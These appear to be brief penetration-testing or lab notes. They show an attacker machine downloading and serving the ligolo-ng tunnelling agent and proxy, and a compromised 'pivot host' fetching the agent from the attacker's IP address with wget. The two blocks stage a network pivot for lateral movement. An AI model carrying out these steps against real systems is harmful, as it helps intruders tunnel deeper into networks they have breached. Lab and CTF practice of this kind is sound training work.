```attacker
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz && wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz && tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && python -m http.server
```


```pivot host 1
wget http://10.10.15.245:8000/agent

```












